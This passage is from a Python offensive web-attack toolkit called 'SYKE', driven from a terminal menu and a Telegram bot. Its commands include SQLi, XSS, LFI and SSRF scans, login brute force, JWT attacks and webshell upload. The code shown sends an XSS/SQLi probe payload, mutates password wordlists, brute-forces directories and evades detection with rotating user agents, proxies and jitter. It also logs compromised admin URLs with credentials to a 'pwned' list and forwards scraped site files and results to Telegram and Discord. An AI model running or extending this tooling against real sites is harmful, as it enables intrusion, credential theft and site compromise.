            "/admin":       "ADMIN FINDER QUEUED",
            "/full":        "FULL AUDIT QUEUED",
            "/fingerprint": "FINGERPRINT QUEUED",
            "/sqli":        "SQLI SCAN QUEUED",
            "/lfi":         "LFI SCAN QUEUED",
            "/xss":         "XSS SCAN QUEUED",
            "/ssrf":        "SSRF SCAN QUEUED",
            "/cors":        "CORS AUDIT QUEUED",
            "/ssl":         "SSL SCAN QUEUED",
            "/backup":      "BACKUP SCAN QUEUED",
            "/headers":     "HEADERS SCAN QUEUED",
            "/login":       "LOGIN BRUTE QUEUED",
            "/jwt":         "JWT ATTACK QUEUED",
            "/oauth":       "OAUTH AUDIT QUEUED",
            "/subdomain":   "SUBDOMAIN SCAN QUEUED",
            "/dns":         "DNS RECON QUEUED",
            "/ports":       "PORT SCAN QUEUED",
            "/waf":         "WAF DETECT QUEUED",
            "/graphql":     "GRAPHQL AUDIT QUEUED",
            "/cpanel":      "CPANEL SCAN QUEUED",
            "/upload":      "WEBSHELL UPLOAD QUEUED",
        }
        for cmd, label in SCAN_CMDS.items():
            if text.lower().startswith(cmd + " ") or text.lower() == cmd:
                parts  = text.split(" ", 1)
                target = parts[1].strip() if len(parts) > 1 else "(no target)"
                r   = self.send(chat_id, f"⏳ Queuing {label.lower()}...")
                mid = self._mid(r)
                time.sleep(0.3)
                body = self._scan_card(label, target, logged or "unknown")
                if mid:
                    self.edit(chat_id, mid, body)
                else:
                    self.send(chat_id, body)
                return

        self._main_menu(chat_id, logged)

    # ── /hook worker (runs in daemon thread) ──────────────────────────
    def _bot_hook(self, chat_id, mid, url, username):
        import tempfile, os as _os
        if not url.startswith("http"):
            url = "https://" + url
        try:
            r = requests.get(url, timeout=15, headers={"User-Agent": "Mozilla/5.0"})
            html = r.text
        except Exception as e:
            self.send(chat_id, f"❌ Fetch failed: <code>{e}</code>")
            return

        tmpdir = tempfile.mkdtemp(prefix="syke_hook_")
        sent   = 0

        def _save_send(fname, content):
            nonlocal sent
            fpath = _os.path.join(tmpdir, fname)
            try:
                with open(fpath, "w", encoding="utf-8", errors="ignore") as fh:
                    fh.write(content)
                cap = f"🪝 {url}\n📄 {fname} ({len(content):,} bytes)\n👤 {username}"
                self.send_document(chat_id, fpath, caption=cap)
                sent += 1
            except Exception:
                pass

        # HTML
        _save_send("index.html", html)

        # External CSS
        import re as _re
        from urllib.parse import urljoin
        for i, href in enumerate(_re.findall(
                r'<link[^>]+rel=["\']stylesheet["\'][^>]+href=["\']([^"\']+)["\']',
                html, _re.IGNORECASE)[:8]):
            try:
                full = href if href.startswith("http") else urljoin(url, href)
                cr = requests.get(full, timeout=10,
                                  headers={"User-Agent": "Mozilla/5.0"})
                if cr.ok:
                    _save_send(f"style_{i+1}.css", cr.text)
            except Exception:
                pass

        # External JS
        for i, src in enumerate(_re.findall(
                r'<script[^>]+src=["\']([^"\']+)["\']', html, _re.IGNORECASE)[:8]):
            try:
                full = src if src.startswith("http") else urljoin(url, src)
                jr = requests.get(full, timeout=10,
                                  headers={"User-Agent": "Mozilla/5.0"})
                if jr.ok:
                    _save_send(f"script_{i+1}.js", jr.text)
            except Exception:
                pass

        # Inline CSS
        inline_css = _re.findall(
            r'<style[^>]*>(.*?)</style>', html, _re.DOTALL | _re.IGNORECASE)
        if inline_css:
            _save_send("inline.css",
                       "\n\n/* === INLINE BLOCK === */\n".join(inline_css))

        # Inline JS
        inline_js = [s.strip() for s in _re.findall(
            r'<script(?![^>]+src=)[^>]*>(.*?)</script>',
            html, _re.DOTALL | _re.IGNORECASE) if s.strip()]
        if inline_js:
            _save_send("inline.js",
                       "\n\n/* === INLINE BLOCK === */\n".join(inline_js))

        summary = (
            f"✅ Hook complete — {url}\n"
            f"📦 {sent} file(s) sent\n"
            f"👤 {username}"
        )
        if mid:
            self.edit(chat_id, mid, summary)
        else:
            self.send(chat_id, summary)

    def _auth_menu(self, chat_id):
        self.send(chat_id,
            "╔══════════════════════════════════════════╗\n"
            "║   SYKE  coded by syke                    ║\n"
            "╠══════════════════════════════════════════╣\n"
            "║  [1]  LOGIN    — existing account        ║\n"
            "║  [2]  SIGN UP  — create new account      ║\n"
            "╚══════════════════════════════════════════╝\n\n"
            "Reply <b>1</b> to login or <b>2</b> to register.")

    def _main_menu(self, chat_id, username):
        self.send(chat_id,
            f"╔══════════════════════════════════════════╗\n"
            f"║   SYKE v4.0  coded by risu               ║\n"
            f"╠══════════════════════════════════════════╣\n"
            f"║  [1]  Web Analysis                       ║\n"
            f"║  [2]  Vulnerability Scanner              ║\n"
            f"║  [3]  Auth &amp; Brute-Force             ║\n"
            f"║  [4]  WordPress Toolkit                  ║\n"
            f"║  [5]  Recon &amp; OSINT                  ║\n"
            f"║  [6]  Advanced Attacks                   ║\n"
            f"║  [7]  Webshell Uploader                  ║\n"
            f"║  [8]  Full Scan                          ║\n"
            f"║  [9]  Exploit Chain Presets              ║\n"
            f"╠══════════════════════════════════════════╣\n"
            f"║  [A]  Results &amp; Reports              ║\n"
            f"║  [B]  Telegram Bot Manager               ║\n"
            f"║  [C]  Configuration                      ║\n"
            f"║  [D]  Suggested Methods                  ║\n"
            f"║  [E]  Extras &amp; New Modules           ║\n"
            f"║  [F]  Admin Finder                       ║\n"
            f"║  [G]  Admin Scanner                      ║\n"
            f"║  [H]  cPanel Tools                       ║\n"
            f"║  [I]  TempMail                           ║\n"
            f"║  [J]  Defacement Grabber                 ║\n"
            f"║  [K]  Site Hooker (HTML/CSS/JS → TG)     ║\n"
            f"╠══════════════════════════════════════════╣\n"
            f"║  — LIVE —  /hook <url>                   ║\n"
            f"║  — QUEUED — /scan /wp /vuln /recon       ║\n"
            f"║  /admin /full /sqli /lfi /xss /ssrf      ║\n"
            f"║  /cors /ssl /backup /waf /graphql        ║\n"
            f"║  /cpanel /subdomain /dns /ports /upload  ║\n"
            f"║  /tempmail /grabber /results /help       ║\n"
            f"╚══════════════════════════════════════════╝\n\n"
            f"Logged in as: <b>{username}</b>")

    def run_polling(self):
        if not self.token:
            print(f"  {RED}[!] No Telegram bot token configured{RST}")
            return
        states = {}
        offset = 0
        _info("Telegram bot polling started...")
        while True:
            try:
                data = self.get_updates(offset=offset, timeout=20)
                for upd in data.get("result", []):
                    offset = upd["update_id"] + 1
                    try:
                        self.handle_update(upd, states)
                    except Exception:
                        pass
                time.sleep(0.5)
            except KeyboardInterrupt:
                break
            except Exception:
                time.sleep(2)


def start_bot_thread():
    token = TELEGRAM_BOT or TG_BOT_TOKEN
    if not token:
        return None
    bot = SykeBot(token)
    t = threading.Thread(target=bot.run_polling, daemon=True)
    t.start()
    return t


                                                                                 
                                               
                                                                                 

def _rand_str(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def _rand_ip():
    return (f"{random.randint(1,254)}.{random.randint(1,254)}."
            f"{random.randint(1,254)}.{random.randint(1,254)}")

def _jitter():
    if DELAY:
        time.sleep(DELAY + random.uniform(0, DELAY * 0.5))

def normalize(url):
    url = url.strip()
    if not url.startswith(("http://","https://")):
        url = "https://" + url
    return url.rstrip("/")

def _make_proxies():
    p = PROXY or PROXY_CFG
    if not p:
        return None
    return {"http": p, "https": p}

def _make_session(extra_headers=None):
    s = requests.Session()
    hdrs = {
        "User-Agent":      random.choice(UA_LIST),
        "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection":      "keep-alive",
    }
    if extra_headers:
        hdrs.update(extra_headers)
    s.headers.update(hdrs)
    p = _make_proxies()
    if p:
        s.proxies = p
    s.verify = VERIFY_SSL
    return s

def _make_waf_session(extra_headers=None):
    s = _make_session(extra_headers)
    s.headers["Accept-Encoding"] = "identity"
    s.headers["Cache-Control"]   = "no-cache"
    return s

def _sess():
    return _make_session()

def _wafsess():
    return _make_waf_session()

def _get(url, **kw):
    try:
        kw.setdefault("timeout",         TIMEOUT)
        kw.setdefault("verify",          VERIFY_SSL)
        kw.setdefault("allow_redirects", True)
        return _sess().get(url, **kw)
    except Exception:
        return None

def _post(url, **kw):
    try:
        kw.setdefault("timeout", TIMEOUT)
        kw.setdefault("verify",  VERIFY_SSL)
        return _sess().post(url, **kw)
    except Exception:
        return None

def _log(level, msg):
    ts  = datetime.datetime.utcnow().strftime("%H:%M:%S")
    if level == "verbose" and not VERBOSE:
        return
    if level == "debug" and not DEBUG and not DEBUG_MODE:
        return
    col = {
        "info":    CYN, "hit":   GRN, "warn":    YLW,
        "err":     RED, "sub":   PUR, "verbose":  DIM,
        "debug":   DIM, "chain": PUR,
    }.get(level, RST)
    print(f"  {DIM}[{ts}]{RST} {col}[{level}]{RST} {msg}")

def _sep(char="═", n=70):
    return char * n

def _box(title, lines, color=None, title_color=None):
    W   = 68
    sep = "═" * W

    print(BLU + f"\n  ╔{sep}╗" + RST)

    padded = f"  {title}  "
    print(BLU + f"  ║{padded:<{W}}║" + RST)

    print(BLU + f"  ╠{sep}╣" + RST)

    for line in lines:
        clean = re.sub(r'\033\[[0-9;]*m', '', str(line))
        pad = max(0, W - 2 - len(clean))

        print(
            BLU + "  ║" + RST +
            f"  {line}" +
            " " * pad +
            BLU + "║" + RST
        )

    print(BLU + f"  ╚{sep}╝\n" + RST)

def _result_box(title, lines):
    _box(title, lines)


def site_hooker(target=None):
    """Fetch HTML, CSS and JS from a target site and forward files to Telegram."""
    _banner()
    url = target or _ask("target-url").strip()
    if not url:
        _pause()
        return
    if not url.startswith("http"):
        url = "https://" + url

    _info(f"Site Hooker → {url}")
    try:
        r = _get(url)
        if not r:
            _err("Failed to fetch target")
            _pause()
            return

        html_content = r.text
        files_found  = []

        # ── HTML ─────────────────────────────────────────────────────
        html_file = os.path.join(OUT_DIR, "hook_index.html")
        with open(html_file, "w", encoding="utf-8", errors="ignore") as fh:
            fh.write(html_content)
        files_found.append(("index.html", html_file))
        _found(f"HTML saved ({len(html_content):,} bytes)")

        # ── External CSS ─────────────────────────────────────────────
        css_links  = re.findall(
            r'<link[^>]+rel=["\']stylesheet["\'][^>]+href=["\']([^"\']+)["\']',
            html_content, re.IGNORECASE)
        css_links += re.findall(
            r'<link[^>]+href=["\']([^"\']+)["\'][^>]+rel=["\']stylesheet["\']',
            html_content, re.IGNORECASE)
        for i, css_url in enumerate(css_links[:10]):
            if not css_url.startswith("http"):
                css_url = urljoin(url, css_url)
            try:
                cr = _get(css_url)
                if cr and cr.text:
                    fname = f"hook_style_{i+1}.css"
                    fpath = os.path.join(OUT_DIR, fname)
                    with open(fpath, "w", encoding="utf-8", errors="ignore") as fh:
                        fh.write(cr.text)
                    files_found.append((fname, fpath))
                    _found(f"CSS: {css_url[:60]}")
            except Exception:
                pass

        # ── External JS ──────────────────────────────────────────────
        js_links = re.findall(
            r'<script[^>]+src=["\']([^"\']+)["\']', html_content, re.IGNORECASE)
        for i, js_url in enumerate(js_links[:10]):
            if not js_url.startswith("http"):
                js_url = urljoin(url, js_url)
            try:
                jr = _get(js_url)
                if jr and jr.text:
                    fname = f"hook_script_{i+1}.js"
                    fpath = os.path.join(OUT_DIR, fname)
                    with open(fpath, "w", encoding="utf-8", errors="ignore") as fh:
                        fh.write(jr.text)
                    files_found.append((fname, fpath))
                    _found(f"JS: {js_url[:60]}")
            except Exception:
                pass

        # ── Inline CSS ───────────────────────────────────────────────
        inline_css = re.findall(
            r'<style[^>]*>(.*?)</style>', html_content,
            re.DOTALL | re.IGNORECASE)
        if inline_css:
            fname = "hook_inline.css"
            fpath = os.path.join(OUT_DIR, fname)
            with open(fpath, "w", encoding="utf-8", errors="ignore") as fh:
                fh.write("\n\n/* === INLINE STYLE BLOCK === */\n".join(inline_css))
            files_found.append((fname, fpath))
            _found(f"Inline CSS: {len(inline_css)} block(s)")

        # ── Inline JS ────────────────────────────────────────────────
        inline_js = re.findall(
            r'<script(?![^>]+src=)[^>]*>(.*?)</script>',
            html_content, re.DOTALL | re.IGNORECASE)
        inline_js = [s.strip() for s in inline_js if s.strip()]
        if inline_js:
            fname = "hook_inline.js"
            fpath = os.path.join(OUT_DIR, fname)
            with open(fpath, "w", encoding="utf-8", errors="ignore") as fh:
                fh.write("\n\n/* === INLINE SCRIPT BLOCK === */\n".join(inline_js))
            files_found.append((fname, fpath))
            _found(f"Inline JS: {len(inline_js)} block(s)")

        _result_box("SITE HOOKER — EXTRACTED FILES", [
            f"{GRN}[{i+1:02d}]{RST}  {fn}  "
            f"{DIM}({os.path.getsize(fp):,} bytes){RST}"
            for i, (fn, fp) in enumerate(files_found)
        ] or [f"{DIM}Nothing extracted{RST}"])

        # ── Forward to Telegram ───────────────────────────────────────
        if TELEGRAM_BOT and TG_RESULT_GROUP and files_found:
            _info(f"Sending {len(files_found)} file(s) to Telegram...")
            bot     = SykeBot(TELEGRAM_BOT)
            hdr     = f"🪝 Site Hooker — {url}"
            for fn, fp in files_found:
                try:
                    bot.send_document(
                        TG_RESULT_GROUP, fp,
                        caption=f"{hdr}\n📄 {fn}")
                    _clean(f"Sent → {fn}")
                except Exception as e:
                    _err(f"TG send failed ({fn}): {e}")
        else:
            _warn("TG bot not configured — files saved locally only")
            _info(f"Output dir: {OUT_DIR}/")

    except KeyboardInterrupt:
        pass
    except Exception as e:
        _err(f"Site Hooker error: {e}")
    _pause()

def _found_box(result_type, target, detail="", found=True):
    W   = 68
    sep = "═" * W
    status = "FOUND" if found else "NOT FOUND"
    color  = GRN if found else RED
    print(BLU + f"\n  ╔{sep}╗" + RST)
    print(f"  {BLU}║{RST}  "
          f"{BLD}{color}[{status}]{RST}  {result_type:<{W-12}}"
          f"{BLU}║{RST}")
    print(BLU + f"  ╠{sep}╣" + RST)
    if detail:
        clean = re.sub(r'\033\[[0-9;]*m', '', str(detail))
        pad   = max(0, W - 2 - len(clean[:64]))
        print(BLU + "  ║" + RST +
              f"  {detail[:64]}" + " " * pad +
              BLU + "║" + RST)
    print(BLU + f"  ╚{sep}╝\n" + RST)
    if found and target:
        _tg_send_result(
            result_type, target, detail,
            CURRENT_USER,
        )

_ROW_GRADS = []  # pystyle gradients removed — pure ANSI blue used throughout

def _loading_bar(current: int, total: int, label: str = "", width: int = 36):
    pct  = int((current / max(total, 1)) * 100)
    done = int((current / max(total, 1)) * width)
    bar  = "█" * done + "▓" * min(1, width - done) + "▒" * min(1, width - done - 1) + "░" * max(0, width - done - 2)
    bar  = bar[:width]
    line = f"  {BLU}[{pct:02d}%]{RST} {BLU}{bar}{RST}  {DIM}{label}{RST}"
    print(f"\r{line}", end="", flush=True)
    if current >= total:
        print()

def _menu_grid(items, cols=3):
    """Render menu items in a wide multi-column all-blue grid."""
    try:
        term_w = os.get_terminal_size().columns
    except Exception:
        term_w = 100
    term_w = max(term_w, 60)
    margin = 2
    cell_w = max(10, (term_w - margin - 2 - (cols - 1)) // cols)

    def row_line(lc, mc, rc):
        seg   = "═" * cell_w
        inner = (seg + mc) * (cols - 1) + seg
        return " " * margin + BLU + lc + inner + rc + RST

    vert = BLU + "║" + RST

    print(row_line("╔", "╦", "╗"))
    rows = [items[i:i+cols] for i in range(0, len(items), cols)]
    for r_idx, row in enumerate(rows):
        if r_idx > 0:
            print(row_line("╠", "╬", "╣"))
        while len(row) < cols:
            row.append("")
        cells = []
        for item in row:
            clean = re.sub(r'\033\[[0-9;]*m', '', str(item))
            padded = " " + clean + " " * max(0, cell_w - len(clean) - 1)
            cells.append(BLU + padded + RST)
        print(" " * margin + vert + vert.join(cells) + vert)
    print(row_line("╚", "╩", "╝"))
    print()

def _menu_box(title, items):
    W   = 68
    sep = "═" * W
    B, R = BLU, RST
    print(f"\n  {B}╔{sep}╗{R}")
    hdr = f"  {title}"
    print(f"  {B}║{R} {B}{hdr:<{W-1}}{R}{B}║{R}")
    print(f"  {B}╠{sep}╣{R}")
    for item in items:
        clean = re.sub(r'\033\[[0-9;]*m', '', str(item))
        pad   = max(0, W - 2 - len(clean))
        print(f"  {B}║{R}  {B}{clean}{R}" + " " * pad + f"  {B}║{R}")
    print(f"  {B}╚{sep}╝{R}\n")

def _menu_box_split(title, items, divider_after=None):
    W   = 68
    sep = "═" * W
    B, R = BLU, RST
    print(f"\n  {B}╔{sep}╗{R}")
    hdr = f"  {title}"
    print(f"  {B}║{R} {B}{hdr:<{W-1}}{R}{B}║{R}")
    print(f"  {B}╠{sep}╣{R}")
    for i, item in enumerate(items):
        if divider_after and i in divider_after:
            print(f"  {B}╠{sep}╣{R}")
        clean = re.sub(r'\033\[[0-9;]*m', '', str(item))
        pad   = max(0, W - 2 - len(clean))
        print(f"  {B}║{R}  {B}{clean}{R}" + " " * pad + f"  {B}║{R}")
    print(f"  {B}╚{sep}╝{R}\n")

def _menu_box_2col(title, left_items, right_items):
    CW = 33
    B, R = BLU, RST
    sl = "═" * CW
    print(f"\n  {B}╔{sl}╦{sl}╗{R}")
    hdr = f"  {title}"
    print(f"  {B}║{R}{B}{hdr:<{CW}}{R}{B}║{R}{'': <{CW}}{B}║{R}")
    print(f"  {B}╠{sl}╬{sl}╣{R}")
    rows = max(len(left_items), len(right_items))
    for i in range(rows):
        l  = left_items[i]  if i < len(left_items)  else ""
        r  = right_items[i] if i < len(right_items) else ""
        lc = re.sub(r'\033\[[0-9;]*m', '', str(l))
        rc = re.sub(r'\033\[[0-9;]*m', '', str(r))
        lp = max(0, CW - 1 - len(lc))
        rp = max(0, CW - 1 - len(rc))
        print(f"  {B}║{R} {B}{lc}{R}" + " " * lp + f"{B}║{R} {B}{rc}{R}" + " " * rp + f"{B}║{R}")
    print(f"  {B}╚{sl}╩{sl}╝{R}\n")

def _ask(prompt):
    try:
        p = f"{RED}  {prompt} : {RST}"
        return input(p).strip()
    except (KeyboardInterrupt, EOFError):
        print()
        return ""

def _ask_pass(prompt="password"):
    try:
        import getpass
        p = f"{RED}  {prompt} : {RST}"
        return getpass.getpass(p).strip()
    except Exception:
        return _ask(prompt)

def _pause():
    try:
        input(f"{BLU}  [press enter to continue]{RST} ")
    except (KeyboardInterrupt, EOFError):
        pass

def _banner():
    os.system("cls" if os.name == "nt" else "clear")
    try:
        term_w = os.get_terminal_size().columns
    except Exception:
        term_w = 100
    lines = BANNER_TEXT.split("\n")
    max_len = max((len(l.rstrip()) for l in lines if l.strip()), default=0)
    left_pad = max(0, (term_w - max_len) // 2)
    for line in lines:
        print(BLU + " " * left_pad + line.rstrip() + RST)
    credit = "Coded by risu"
    pad = max(0, (term_w - len(credit)) // 2)
    print(BLU + " " * pad + credit + RST)
    print()
    if CURRENT_USER:
        info = f"  logged in as: {CURRENT_USER}   tg group: {TG_RESULT_GROUP}"
        print(BLU + info + RST + "\n")

def show_banner():
    _banner()

def _info(msg):
    print(f"  {CYN}[*]{RST} {msg}")

def _found(msg):
    print(f"  {GRN}[+]{RST} {msg}")

def _vuln(msg):
    print(f"  {RED}[!]{RST} {BLD}{msg}{RST}")

def _warn(msg):
    print(f"  {YLW}[~]{RST} {msg}")

def _err(msg):
    print(f"  {RED}[x]{RST} {msg}")

def _clean(msg):
    print(f"  {GRN}[ok]{RST} {msg}")

def _hit(path, code, size, note=""):
    col = GRN if code == 200 else YLW if code == 403 else DIM
    sz  = f"{size}b" if size >= 0 else "?"
    print(f"  {col}[{code}]{RST} {path:<50} {DIM}{sz}{RST} {YLW}{note}{RST}")

def _add_finding(sev, title, target, desc, evid, fix, cat="General"):
    with LOCK:
        entry = {
            "sev":    sev,
            "title":  title,
            "target": target[:200],
            "desc":   desc[:300],
            "evid":   evid[:200],
            "fix":    fix[:300],
            "cat":    cat,
            "ts":     datetime.datetime.utcnow().isoformat(),
        }
        FINDINGS.append(entry)
        STATS["total"] += 1
        sev_map = {
            "CRITICAL": "crit", "HIGH": "hi", "MEDIUM": "med",
            "LOW": "lo", "INFO": "info",
        }
        key = sev_map.get(sev)
        if key:
            STATS[key] += 1

def _stats_bar():
    ela = time.time() - _start_time
    return (
        f"  {PUR}[CRIT:{STATS['crit']}]{RST} "
        f"{RED}[HIGH:{STATS['hi']}]{RST} "
        f"{YLW}[MED:{STATS['med']}]{RST} "
        f"{BLU}[LOW:{STATS['lo']}]{RST} "
        f"{DIM}[INFO:{STATS['info']}]{RST} "
        f"{DIM}[total:{STATS['total']}  {ela:.0f}s]{RST}"
    )

def _notify_discord(msg):
    if not DISCORD_HOOK:
        return
    try:
        requests.post(
            DISCORD_HOOK,
            json={"content": f"```\n{msg[:1900]}\n```"},
            timeout=8,
        )
    except Exception:
        pass

def _notify_telegram(msg):
    _tg_send(msg)

def _save_results(target, admin_url="", creds=None, extra=None):
    with LOCK:
        rec = {
            "target":    target,
            "admin_url": admin_url,
            "username":  (creds or {}).get("user",""),
            "password":  (creds or {}).get("pass",""),
            "timestamp": datetime.datetime.utcnow().isoformat(),
        }
        if extra:
            rec.update(extra)
        if admin_url:
            line = f"{admin_url}|{rec['username']}|{rec['password']}"
            PWNED_LIST.append(line)
            os.makedirs(OUT_DIR, exist_ok=True)
            with open(os.path.join(OUT_DIR, OUTPUT_FILE), "a",
                      encoding="utf-8") as fh:
                fh.write(line + "\n")

def _load_resume():
    global PROGRESS
    if os.path.exists(RESUME_FILE):
        try:
            with open(RESUME_FILE) as f:
                PROGRESS = json.load(f)
        except Exception:
            PROGRESS = {}

def _load_targets(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [l.strip() for l in f if l.strip() and not l.startswith("#")]
    except Exception:
        _err(f"Cannot read file: {path}")
        return []

def check_host(url):
    url = normalize(url)
    try:
        r = _get(url, timeout=TIMEOUT, allow_redirects=True)
        if r is None:
            _err(f"Cannot reach: {url}")
            return False, url, None
        return True, r.url or url, r
    except Exception as e:
        _err(f"Connection failed: {e}")
        return False, url, None

def normalize_base(url):
    return normalize(url.rstrip("/"))

def generate_custom_wordlist(base, rules=None):
    if rules is None:
        rules = ["capitalize","append_year","append_nums","leet"]
    out  = list(base)
    year = str(datetime.datetime.utcnow().year)
    for w in base:
        if "capitalize" in rules:
            out.append(w.capitalize())
        if "append_year" in rules:
            out.append(w + year)
            out.append(w + year[-2:])
        if "append_nums" in rules:
            for n in ["1","123","1234","12345"]:
                out.append(w + n)
        if "leet" in rules:
            leet = (w.replace("a","4").replace("e","3")
                     .replace("i","1").replace("o","0").replace("s","5"))
            out.append(leet)
        if "append_special" in rules:
            for sp in ["!","@","#","$"]:
                out.append(w + sp)
    return list(dict.fromkeys(out))

def _html_escape(s):
    return _html_mod.escape(str(s))


                                                                                 
                      
                                                                                 

def _terminal_login():
    """
    Terminal-based login gate. Users must sign in or register before
    accessing any scan modules. Credentials are stored in syke_users.json.
    """
    global CURRENT_USER
    _banner()
    _menu_box("MAIN MENU  coded by syke — AUTH GATE", [
        f"{CYN}[1]{RST}  SIGN IN  — create a new account",
        f"{CYN}[2]{RST}  LOGIN    — access existing account",
        f"{DIM}[0]  exit{RST}",
    ])
    while True:
        choice = _ask("auth-choice")
        if choice == "0":
            sys.exit(0)
        if choice == "1":
            _banner()
            print(BLU +
                "\n  ╔══════════════════════════════════╗\n"
                "  ║  SYKE — CREATE ACCOUNT           ║\n"
                "  ╚══════════════════════════════════╝\n" + RST)
            uname = _ask("username")
            if not uname:
                continue
            pwd   = _ask_pass("password")
            if not pwd:
                continue
            ok, msg = _tg_register_user(uname, pwd, f"terminal_{uname}")
            if ok:
                CURRENT_USER = uname
                _clean(f"Account created. Welcome, {uname}.")
                time.sleep(0.8)
                return
            else:
                _err(f"Registration failed: {msg}")
                continue
        if choice == "2":
            _banner()
            print(BLU +
                "\n  ╔══════════════════════════════════╗\n"
                "  ║  SYKE — LOGIN                    ║\n"
                "  ╚══════════════════════════════════╝\n" + RST)
            uname = _ask("username")
            if not uname:
                continue
            pwd   = _ask_pass("password")
            ok, result = _tg_login_user(uname, pwd, f"terminal_{uname}")
            if ok:
                CURRENT_USER = result
                _clean(f"Welcome back, {CURRENT_USER}.")
                time.sleep(0.8)
                return
            else:
                _err(f"Login failed: {result}")
                continue
        _err("Choose 1 or 2.")


                                                                                 
              
                                                                                 

def fingerprint_wp(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    info = {"url": base, "is_wordpress": False}
    try:
        r    = sess.get(base + "/", timeout=timeout, verify=VERIFY_SSL)
        html = r.text if r else ""
        hdr  = str(dict(r.headers)).lower() if r else ""
        wp_signs = ["wp-content","wp-includes","wp-login","wordpress","xmlrpc.php"]
        if any(s in html.lower() or s in hdr for s in wp_signs):
            info["is_wordpress"] = True
        m = WP_VER_RES.search(html)
        if m:
            info["wp_version"] = next((v for v in m.groups() if v), None)
        for hdr_name in FINGERPRINT_HEADERS:
            val = r.headers.get(hdr_name) if r else None
            if val:
                info[f"hdr_{hdr_name.lower().replace('-','_')}"] = val
        if r:
            info["ssl"]    = base.startswith("https://")
            info["status"] = r.status_code
    except Exception as e:
        _log("debug", f"WP fingerprint error: {e}")
    return info

def detect_waf(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    info = {"detected": False, "type": None, "confidence": 0, "headers": {}}
    try:
        probe = "/?syke_probe=<script>alert(1)</script>'OR'1'='1"
        r = sess.get(base + probe, timeout=timeout, verify=VERIFY_SSL)
        hdr_str = str(dict(r.headers)).lower()
        info["headers"] = dict(r.headers)
        for waf_name, sigs in WAF_SIGNATURES.items():
            for sig in sigs:
                if sig.lower() in hdr_str or sig.lower() in r.text.lower():
                    info["detected"]     = True
                    info["type"]         = waf_name
                    info["confidence"] += 1
                    break
        if r.status_code == 403 and not info["detected"]:
            info["detected"]  = True
            info["type"]      = "generic_403"
            info["confidence"] = 1
    except Exception:
        pass
    return info

def headers_enumeration(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    result = {}
    try:
        r = sess.get(base + "/", timeout=timeout, verify=VERIFY_SSL)
        if r:
            for h in FINGERPRINT_HEADERS:
                v = r.headers.get(h)
                if v:
                    result[h] = v
    except Exception:
        pass
    return result

def check_http_security_headers(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    required = {
        "Strict-Transport-Security":   "HSTS missing",
        "Content-Security-Policy":     "CSP missing",
        "X-Frame-Options":             "clickjacking risk",
        "X-Content-Type-Options":      "MIME sniffing risk",
        "Referrer-Policy":             "referrer leakage",
        "Permissions-Policy":          "feature policy missing",
    }
    result = {"missing": [], "present": {}}
    try:
        r = sess.get(base + "/", timeout=timeout, verify=VERIFY_SSL)
        for hdr, risk in required.items():
            v = r.headers.get(hdr)
            if v:
                result["present"][hdr] = v
            else:
                result["missing"].append({"header": hdr, "risk": risk})
        cors = r.headers.get("Access-Control-Allow-Origin","")
        if cors == "*":
            result["cors_wildcard"] = True
    except Exception:
        pass
    return result

def check_cookie_security(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    issues = []
    try:
        r = sess.get(base + "/", timeout=timeout, verify=VERIFY_SSL)
        for cookie in r.cookies:
            if not cookie.secure:
                issues.append(f"Cookie {cookie.name}: missing Secure flag")
            if not cookie.has_nonstandard_attr("HttpOnly"):
                issues.append(f"Cookie {cookie.name}: missing HttpOnly flag")
    except Exception:
        pass
    return issues

def check_debug_mode(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    paths = [
        "/debug", "/_debug", "/debug.php",
        "/test.php", "/info.php", "/phpinfo.php",
        "/server-status", "/server-info",
    ]
    result = []
    for path in paths:
        try:
            r = sess.get(base + path, timeout=timeout, verify=VERIFY_SSL)
            if r and r.status_code == 200:
                debug_sigs = ["debug","phpinfo","server status","x-debug",
                              "xdebug","debug_backtrace"]
                if any(s in r.text.lower() for s in debug_sigs):
                    result.append({"path": base+path, "status": 200})
        except Exception:
            pass
    return result

def ssl_info_probe(base, timeout=5):
    parsed   = urlparse(base)
    hostname = parsed.hostname
    result   = {}
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        with ctx.wrap_socket(
            socket.socket(), server_hostname=hostname
        ) as conn:
            conn.settimeout(timeout)
            conn.connect((hostname, 443))
            cert   = conn.getpeercert(binary_form=False)
            cipher = conn.cipher()
            proto  = conn.version()
        result["protocol"] = proto
        result["cipher"]   = cipher[0] if cipher else "?"
        if cert:
            subject   = dict(x[0] for x in cert.get("subject", []))
            issuer    = dict(x[0] for x in cert.get("issuer",  []))
            not_after = cert.get("notAfter","")
            result["cn"]        = subject.get("commonName","?")
            result["issuer"]    = issuer.get("organizationName","?")
            result["not_after"] = not_after
    except Exception as e:
        result["error"] = str(e)
    return result

def sitemap_enum(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    urls = []
    sm_paths = ["/sitemap.xml","/sitemap_index.xml",
                "/robots.txt","/sitemap.xml.gz"]
    for path in sm_paths:
        try:
            r = sess.get(base + path, timeout=timeout, verify=VERIFY_SSL)
            if r and r.status_code == 200:
                found = re.findall(r'<loc>\s*(https?://[^\s<]+)\s*</loc>', r.text)
                for u in found[:50]:
                    urls.append({"url": u, "type": "sitemap"})
                allows = re.findall(r'Allow:\s*(/.+)', r.text)
                disallows = re.findall(r'Disallow:\s*(/.+)', r.text)
                for d in disallows[:20]:
                    urls.append({"url": base+d.strip(), "type": "robots-disallow"})
                for a in allows[:10]:
                    urls.append({"url": base+a.strip(), "type": "robots-allow"})
        except Exception:
            pass
    return urls

def directory_bruteforce(sess, base, wordlist=None, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    if wordlist is None:
        wordlist = BRUTEFORCE_WORDLISTS["common_paths"]
    found = []
    def _chk(path):
        try:
            r = sess.get(base + path, timeout=timeout,
                         verify=VERIFY_SSL, allow_redirects=False)
            if r and r.status_code not in (404, 410):
                found.append({"path": base+path, "status": r.status_code,
                               "size": len(r.content)})
        except Exception:
            pass
